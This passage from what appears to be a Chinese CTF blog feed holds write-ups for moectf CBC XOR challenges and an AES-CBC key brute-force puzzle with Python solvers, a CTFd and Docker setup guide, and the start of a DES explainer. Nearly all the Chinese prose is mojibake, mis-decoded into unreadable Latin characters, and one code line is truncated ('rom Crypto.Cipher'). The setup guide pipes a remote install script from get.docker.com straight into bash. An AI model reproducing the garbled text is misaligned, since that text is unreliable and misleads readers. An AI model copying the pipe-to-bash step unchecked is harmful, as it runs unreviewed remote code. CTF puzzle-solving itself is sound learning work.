<p>å¯†æ–‡å— = æ˜æ–‡å— ^ iv ^ K</p>
<p>æ˜æ–‡å— = å¯†æ–‡å— ^ iv ^ K</p>
<p>K = å¯†æ–‡å— ^ æ˜æ–‡å— ^ iv</p>
<p>K = IV ^ bytes_to_long(plain_block[0]) ^ c[0]</p>
<h3 id="WP-10"><a href="#WP-10" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">c = [<span class="number">748044282</span>, <span class="number">2053864743</span>, <span class="number">734492413</span>, <span class="number">675117672</span>, <span class="number">1691099828</span>, <span class="number">1729574447</span>, <span class="number">1691102180</span>, <span class="number">657669994</span>, <span class="number">1741780405</span>, <span class="number">842228028</span>, <span class="number">1909206003</span>, <span class="number">1797919307</span>]</span><br><span class="line">IV = bytes_to_long(<span class="string">b&#x27;cbc!&#x27;</span>)</span><br><span class="line">block_length = <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;moectf&#123;&#x27;</span></span><br><span class="line">plain_block = [flag[block_length * i: block_length * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // block_length)]</span><br><span class="line"> </span><br><span class="line">K = IV ^ bytes_to_long(plain_block[<span class="number">0</span>]) ^ c[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(K)</span><br><span class="line"> </span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    m += long_to_bytes(c[i]^c[i+<span class="number">1</span>]^K)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;moec&#x27;</span>+m)</span><br><span class="line"><span class="comment"># 580598200</span></span><br><span class="line"><span class="comment"># b&#x27;tf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="moectf-ez-chain"><a href="#moectf-ez-chain" class="headerlink" title="moectf ez_chain"></a>moectf ez_chain</h3><h3 id="é¢˜ç›®-12"><a href="#é¢˜ç›®-12" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    key = <span class="built_in">int</span>(fs.read().strip())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line">blocks = blockize(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(encrypt_block_cbc(blocks, iv, key))</span><br><span class="line"><span class="comment"># [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å†™ä¸€ä¸ª decrypt_block_cbc å’Œ deblockizeå‡½æ•°</p>
<p>K = å¯†æ–‡å— ^ æ˜æ–‡å— ^ iv</p>
<h3 id="WP-11"><a href="#WP-11" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line">blocks = [<span class="number">8490961288</span>, <span class="number">122685644196</span>, <span class="number">349851982069</span>, <span class="number">319462619019</span>, <span class="number">74697733110</span>, <span class="number">43107579733</span>, <span class="number">465430019828</span>, <span class="number">178715374673</span>, <span class="number">425695308534</span>, <span class="number">164022852989</span>, <span class="number">435966065649</span>, <span class="number">222907886694</span>, <span class="number">420391941825</span>, <span class="number">173833246025</span>, <span class="number">329708930734</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># å–ä½™æ•° å­˜å…¥ out</span></span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblockize</span>(<span class="params">blocks</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        out = out * base + block</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># blocks[0] ^ iv ^ key =  flag[0]</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    <span class="comment"># iv åˆå§‹åŒ–å‘é‡</span></span><br><span class="line">    encrypted = [iv, *blocks]</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        decrypted.append(encrypted[i] ^ encrypted[i + <span class="number">1</span>] ^ key)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"> </span><br><span class="line"><span class="comment">#  flag = moectf&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">#  72ä¸ªå­—ç¬¦  å…¶ä¸­ moectf 6 &#123;&#125; 2  72-2-6=64ä¸ª</span></span><br><span class="line"><span class="comment">#  flag[0] = blocks[0] ^ key ^ iv</span></span><br><span class="line"><span class="comment">#  key = iv ^ blocks[0] ^ flag[0]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] )</span><br><span class="line"><span class="comment"># print(blockize(bytes_to_long(b&quot;moectf&#123;&quot; + b&quot;0&quot;*64 + b&quot;&#125;&quot;)))</span></span><br><span class="line">key = blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] ^ iv ^ blocks[<span class="number">0</span>]</span><br><span class="line">m = long_to_bytes(deblockize(decrypt_block_cbc(blocks, iv, key)))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>,key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="aes3"><a href="#aes3" class="headerlink" title="aes3"></a>aes3</h2><h3 id="é¢˜ç›®-13"><a href="#é¢˜ç›®-13" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rom Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>:] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"> </span><br><span class="line">key = <span class="string">b&quot;J1fx2g1jDak1c***&quot;</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"> </span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line"> </span><br><span class="line">iv = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(aes.encrypt(message)))</span><br><span class="line"><span class="comment">#******************************************************************************************************************************************************6ece036e495d363b647d7f2749c4c2f3dd78f8637b</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-8"><a href="#é¢˜ç›®åˆ†æ-8" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>1.keyåä¸‰ä½æœªçŸ¥ å¯çˆ†ç ´</p>
<p>2.æ˜æ–‡message åˆ†3éƒ¨åˆ† ç¬¬ä¸€éƒ¨åˆ†æ˜æ–‡å·²çŸ¥ï¼Œä¸­é—´éƒ¨åˆ† 10ä¸ªåå…­è¿›åˆ¶å­—ç¬¦  åéƒ¨åˆ†ä¸º 2ä¸ª0x02 å…±192ä¸ªåå…­è¿›åˆ¶å­—ç¬¦</p>
<p>message = message + bytes((l - len(message) % l) * chr(l - len(message) % l), encoding = â€œutf-8â€)</p>
<p>å³ bytes((16-94)%16 * chr((16-(94%16)))ï¼‰</p>
<p>= bytes(2 * chr (2) ) -&gt; 0x02 0x02</p>
<p>3.iv = flag[5:-1] å³flag{iv} æ±‚å‡ºivå³flag</p>
<p>4.å·²çŸ¥æ˜æ–‡å21å­—èŠ‚ æ ¹æ®åˆ†ç»„ æ¯ç»„16å­—èŠ‚ æ‰€ä»¥å·²çŸ¥æœ€åä¸€å—æ˜æ–‡ åŠ å€’æ•°ç¬¬äºŒå—å5å­—èŠ‚æ˜æ–‡</p>
<p><img src="/posts/22530663/1.png"></p>
<p>åœ¨CBCä¸­ ä¸ECBç›¸æ¯” å¤šçš„éƒ¨åˆ†ä¸ºIV å¼‚æˆ–ä¸€æ­¥</p>
<p>å¯†æ–‡ ^ key (AES_ECB)  ^ IV â†’ æ˜æ–‡</p>
<p>æœ€åä¸€å—çš„æ˜æ–‡å·²çŸ¥</p>
<p>key å¯é€šè¿‡çˆ†ç ´åä¸‰ä½</p>
<p>æœ€åä¸€å—çš„å¯†æ–‡ä¸º  bâ€ssedâ€ + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:10] +  bytes((l - len(message) % l) * chr(l - len(message) % l)  å¦‚æœkeyå·²çŸ¥  åˆ™å¯†æ–‡ä¹Ÿå°±æ˜¯å·²çŸ¥çš„</p>
<p>æˆ‘ä»¬è¿˜çŸ¥é“å€’æ•°ç¬¬äºŒå—ä¸­çš„å5ä¸ªå­—èŠ‚  å¯ä»¥ä½œä¸ºæœ€åä¸€æ¬¡åŠ å¯†çš„IV çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ ¡éªŒ </p>
<p>IV = æ˜æ–‡ ^ ( å¯†æ–‡ ^ key )</p>
<p>å¦‚æœ ç»“æœä¸­åŒ…å« å·²çŸ¥çš„5ä¸ªå­—èŠ‚ è¯´æ˜keyæ­£ç¡®</p>
<p>æ±‚å¾—keyå å¯è¿›è€Œæ¨å‡º IV å³ flag</p>
<p>Plaintext[0] = Ciphertext[0] ^ key ^ IV</p>
<p>Plaintext[1] = Ciphertext[1] ^ key ^ Ciphertext[0]</p>
<p>Plaintext[2] = Ciphertext[2] ^ key ^ Ciphertext[1]</p>
<p>çŸ¥é“æœ€åä¸€ä¸ªæ˜æ–‡ å¯†æ–‡ key ä»¥æ­¤åå¤æ¨å‡ºIV</p>
<h3 id="WP-12"><a href="#WP-12" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 1. ç”Ÿæˆkeyå­—å…¸</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">dic = string.printable[:<span class="number">62</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key_table.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                key = <span class="string">b&quot;J1fx2g1jDak1c&quot;</span>+i.encode()+j.encode()+k.encode()</span><br><span class="line">                file.write(key+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2.çˆ†ç ´key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">m: <span class="built_in">bytes</span>, c: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(m, c)])</span><br><span class="line"> </span><br><span class="line">enc = binascii.unhexlify(<span class="string">&#x27;5d363b647d7f2749c4c2f3dd78f8637b&#x27;</span>)</span><br><span class="line">five_part = binascii.unhexlify(<span class="string">b&quot;6ece036e49&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;key_table.txt&quot;</span>,<span class="string">&quot;rb+&quot;</span>)</span><br><span class="line">pbar = tqdm(<span class="built_in">range</span>(<span class="number">238328</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    key = i[:<span class="number">16</span>]</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = aes.decrypt(enc)</span><br><span class="line">    <span class="comment"># ä¸€å— 16ä¸ªå­—èŠ‚ 4+10+2</span></span><br><span class="line">    m = <span class="string">b&quot;ssed&quot;</span> +binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]+<span class="string">b&#x27;\x02\x02&#x27;</span></span><br><span class="line">    xor_result = xor(m,dec)</span><br><span class="line">    pbar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> five_part <span class="keyword">in</span> xor_result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] key:&quot;</span>,key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 3.æ±‚IV</span></span><br><span class="line">l = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="comment"># 192</span></span><br><span class="line">message = <span class="string">b&quot;I have had my invitation to this world&#x27;s festival, and thus my life has been blessed&quot;</span> + binascii.unhexlify(hashlib.sha256(key).hexdigest())[:<span class="number">10</span>]</span><br><span class="line">message = message + <span class="built_in">bytes</span>((l - <span class="built_in">len</span>(message) % l) * <span class="built_in">chr</span>(l - <span class="built_in">len</span>(message) % l), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(message),<span class="number">16</span>):</span><br><span class="line">    aes_ecb = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    dec_c = aes_ecb.decrypt(enc)</span><br><span class="line">    enc = xor(message[<span class="built_in">len</span>(message)-i-<span class="number">16</span>:<span class="built_in">len</span>(message)-i],dec_c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span>+enc+<span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFdæ­å»º</title>
    <url>/posts/40446ce/</url>
    <content><![CDATA[<ol>
<li><p>åˆ‡æ¢å›½å†…æº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/apt/source.list /etc/apt/source.list.bak</span><br><span class="line">vim /etc/apt/source.list </span><br><span class="line">æ³¨é‡Šæ›¿æ¢ä¸º</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse </span><br><span class="line">ç„¶åsudo apt update   sudo apt upgrade </span><br></pre></td></tr></table></figure></li>
<li><p>å®‰è£…pip</p>
<p><code>sudo apt install pip</code></p>
</li>
<li><p>å®‰è£…git</p>
<p><code>apt-get install git -y</code></p>
</li>
<li><p>å®‰è£…curl</p>
<p><code>apt-get install curl -y</code></p>
</li>
<li><p>å®‰è£…docker </p>
<p><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></p>
</li>
<li><p>å®‰è£…docker-compose</p>
</li>
<li><p>dockeré›†ç¾¤è®¾ç½®</p>
</li>
</ol>
<p>â€‹        <code>docker swarm init</code>  # åˆå§‹åŒ–</p>
<p>â€‹        <code>docker node ls</code> # æŸ¥çœ‹èŠ‚ç‚¹ID</p>
<p>â€‹        <code>docker node update --label-add name=linux-1  &lt;èŠ‚ç‚¹ID&gt;</code>  # æ·»åŠ åˆ«å</p>
<p>8.æ‹·è´å·²ç»ä¿®æ”¹è¿‡çš„ctfd_3.5.0 ç„¶åè¿›å…¥ ç¬¬ä¸€å±‚ç›®å½•  sudo docker-compose build </p>
<p>â€‹        <code>sudo docker-compose up -d</code> å¯åŠ¨docker</p>
<p>9.è®¿é—®webç«¯è¿›è¡Œåˆå§‹åŒ–é…ç½®</p>
<p>10.é…ç½®ctfd-whale</p>
<p><img src="/posts/40446ce/1.png"></p>
<p><img src="/posts/40446ce/2.png"></p>
<p>è¿™é‡Œä¿®æ”¹å¯¹åº”çš„ frp direct ip Address</p>
<hr>
<p>docker-compose æŠ¥é”™ TypeError: kwargs_from_env() got an unexpected keyword argument â€˜ssl_versionâ€™</p>
<p>è§£å†³æ–¹æ¡ˆ ï¼š  pip install docker==6.1.3</p>
<p><img src="/posts/40446ce/3.png"></p>
<p><a href="https://blog.csdn.net/dl1456074580/article/details/135209246">https://blog.csdn.net/dl1456074580/article/details/135209246</a></p>
<p>å‚è€ƒæ–‡ç« </p>
<p><a href="https://www.zhaoj.in/read-6333.html">https://www.zhaoj.in/read-6333.html</a></p>
<p><a href="https://www.anyiblog.top/2023/04/13/20230413/">https://www.anyiblog.top/2023/04/13/20230413/</a></p>
]]></content>
      <categories>
        <category>CTFd</category>
      </categories>
      <tags>
        <tag>CTFd</tag>
      </tags>
  </entry>
  <entry>
    <title>DESåŠ å¯†</title>
    <url>/posts/64eed679/</url>
    <content><![CDATA[<h1 id="DESç®—æ³•ç®€ä»‹"><a href="#DESç®—æ³•ç®€ä»‹" class="headerlink" title="DESç®—æ³•ç®€ä»‹"></a>DESç®—æ³•ç®€ä»‹</h1><p>DES   æ˜¯ä¸€ç§å…¸å‹çš„åˆ†ç»„å¯†ç ï¼Œã€å°†å›ºå®šé•¿åº¦çš„æ˜æ–‡é€šè¿‡ä¸€ç³»åˆ—å¤æ‚çš„æ“ä½œå˜æˆåŒæ ·é•¿åº¦å¯†æ–‡çš„ç®—æ³•ã€‘</p>
<p>åœ¨è¿è¡Œä¸€æ¬¡DESç®—æ³•å åªèƒ½å¯¹<strong>64ä½é•¿åº¦</strong>çš„æ•°æ®è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œæ‰€ä»¥ä¸é€‚ç”¨äºå¯¹å¤§æ•°æ®è¿›è¡Œå¤„ç†ã€‚</p>
<p>å¯¹ç§°åŠ å¯†ç®—æ³• ä½¿ç”¨ç›¸åŒçš„å¯†ç è¿›è¡ŒåŠ å¯†ä¸è§£å¯†ã€‚</p>
<p>æ˜æ–‡ï¼š64ä½</p>
<p>å¯†æ–‡ï¼š64ä½</p>
<p>å¯†é’¥ï¼š64ä½ã€å®é™… <strong>56</strong> ä½ æ¯8ä½ä¸­å«ä¸€ä½å¥‡å¶æ ¡éªŒä½ 8,16,24â€¦64ã€‘</p>
<p>ä½¿ç”¨Feistelæ¡†æ¶ï¼Œé‡‡ç”¨16è½®å¾ªç¯åŠ å¯†</p>
<h1 id="DESç®—æ³•åŸç†"><a href="#DESç®—æ³•åŸç†" class="headerlink" title="DESç®—æ³•åŸç†"></a>DESç®—æ³•åŸç†</h1><h2 id="Feistelç½‘ç»œ"><a href="#Feistelç½‘ç»œ" class="headerlink" title="Feistelç½‘ç»œ"></a>Feistelç½‘ç»œ</h2><p>Feistel cipher ä¹Ÿå«åšLubyâ€“Rackoffåˆ†ç»„å¯†ç  DESå°±ä½¿ç”¨çš„è¯¥æ–¹æ³•ï¼ŒåŠ å¯†å’Œè§£å¯†æ“ä½œç›¸ä¼¼ï¼Œéœ€è¦è¿›è¡Œå¤šè½®çš„åŠ è§£å¯†æ“ä½œã€‚</p>
<p>åœ¨Feistelç½‘ç»œä¸­ åŠ å¯†çš„å„ä¸ªæ­¥éª¤ç§°ä¸º è½® ï¼Œ æ•´ä¸ªåŠ å¯†è¿‡ç¨‹å°±æ˜¯è¿›è¡Œè‹¥å¹²è½®çš„å¾ªç¯ã€‚</p>
<p><img src="/posts/64eed679/1.png"></p>
<p>ä¸€è½®è¿‡ç¨‹å…·ä½“å¦‚ä¸‹ï¼š</p>
<p>1.å°†è¾“å…¥çš„64bit åˆ†æˆä¸¤ç»„32bitã€è®°ä½œå·¦ä¾§ã€å³ä¾§ã€‘</p>
<p>2.å°†å³ä¾§æ•°æ®ç›´æ¥å‘é€åˆ°å³ä¾§è¾“å‡ºä¸­</p>
<p>3.å°†å³ä¾§æ•°æ®å‘é€ç»™è½®å‡½æ•°ï¼Œè½®å‡½æ•°é€šè¿‡å­å¯†é’¥å’Œå³ä¾§æ•°æ® è¿›è¡Œè¿ç®—å¤„ç†ç”ŸæˆåŠ å¯†çš„æ¯”ç‰¹åºåˆ—</p>
<p>4.å°†å¤„ç†åçš„æ•°æ®ä¸å·¦ä¾§æ•°æ®è¿›è¡ŒXORï¼Œå°†åŠ å¯†ç»“æœä½œä¸ºå·¦ä¾§è¾“å‡ºæ•°æ®</p>
<p>ä»ä¸Šå›¾å¯çœ‹å‡ºï¼Œå³ä¾§æ•°æ®å¹¶æ²¡æœ‰è¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤éœ€è¦ç”¨ä¸åŒçš„å­å¯†é’¥è¿›è¡Œè‹¥å¹²è½®å¤„ç†ï¼Œå¹¶å°†æ¯æ¬¡å¤„ç†å‰å·¦å³ä¾§æ•°æ®å¯¹è°ƒã€‚ã€æœ€åä¸€è½®ä¸­ä¸å†è¿›è¡Œå·¦å³ä¾§æ•°æ®å¯¹è°ƒã€‘</p>
<h2 id="DESåŠ å¯†æµç¨‹"><a href="#DESåŠ å¯†æµç¨‹" class="headerlink" title="DESåŠ å¯†æµç¨‹"></a>DESåŠ å¯†æµç¨‹</h2><p>DESåŠ å¯†æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/posts/64eed679/2.png"></p>
<p>ç®€è¦æ¦‚æ‹¬ä¸ºï¼š</p>
<p>1.å°†æ˜æ–‡è¿›è¡Œ åˆå§‹ç½®æ¢IP</p>
<p>2.è¿›è¡Œ16è½®åŠ å¯†å¤„ç†</p>
<p>3.è¿›è¡Œ é€†åˆå§‹ç½®æ¢IP-1 ï¼Œè¾“å‡ºå¯†æ–‡</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“</p>
<ul>
<li>æ˜æ–‡å¤„ç†é˜¶æ®µ</li>
</ul>
<p>æ˜æ–‡åˆå§‹ç½®æ¢ã€64ä½ã€‘ ç½®æ¢åæ˜æ–‡åˆ†2ç»„ã€32ä½ã€‘</p>
<ul>
<li><p>å­å¯†é’¥ç”Ÿæˆé˜¶æ®µ</p>
</li>
<li><p>åŠ å¯†é˜¶æ®µ</p>
</li>
<li><p>å¯†æ–‡é€†ç½®æ¢é˜¶æ®µ</p>
</li>
</ul>
<p>å°†ä¸Šè¿°æ“ä½œçš„å¯†æ–‡è¿›è¡Œé€†ç½®æ¢å¾—åˆ°æœ€ç»ˆå¯†æ–‡</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<h3 id="åˆå§‹ç½®æ¢"><a href="#åˆå§‹ç½®æ¢" class="headerlink" title="åˆå§‹ç½®æ¢"></a>åˆå§‹ç½®æ¢</h3><p>IPç½®æ¢ å°†è¾“å…¥çš„64ä½æ•°æ®å—é‡æ–°ç»„åˆï¼Œå¹¶åˆ†ä¸ºL0 R0ä¸¤ç»„ï¼Œæ¯éƒ¨åˆ†32ä½ã€å®é™…åˆ†ç»„ä¸­ å‰32ä½æ•°æ®ä¸ºLç»„ å32ä½æ•°æ®ä½Rç»„ã€‘</p>
<p>åˆå§‹ç½®æ¢è¡¨å¦‚ä¸‹ï¼š</p>
<p><img src="/posts/64eed679/3.png"></p>
<p>é¦–å…ˆå°†64ä½æ˜æ–‡æ•°æ® æŒ‰ä»å·¦åˆ°å³ï¼Œä»ä¸Šåˆ°ä¸‹æ’åˆ—ä¸º8x8çŸ©é˜µã€‚</p>
<p>0è¡Œ0åˆ—å‡º58 è¡¨ç¤ºå°†ç¬¬58ä½ä¸Šçš„æ•°å€¼ç½®æ¢åˆ°0,0å¤„çš„å€¼  æ€»å…±éœ€è¦ç½®æ¢64æ¬¡å¾—åˆ°æœ€ç»ˆç»“æœã€‚</p>
<h3 id="è½®å‡½æ•°F"><a href="#è½®å‡½æ•°F" class="headerlink" title="è½®å‡½æ•°F"></a>è½®å‡½æ•°F</h3><p>DESä¸­</p>
<p><img src="/posts/64eed679/4.png"></p>
<p>å¯ç®€å•æ¦‚æ‹¬ä¸ºå¦‚ä¸‹æ­¥éª¤ï¼š</p>
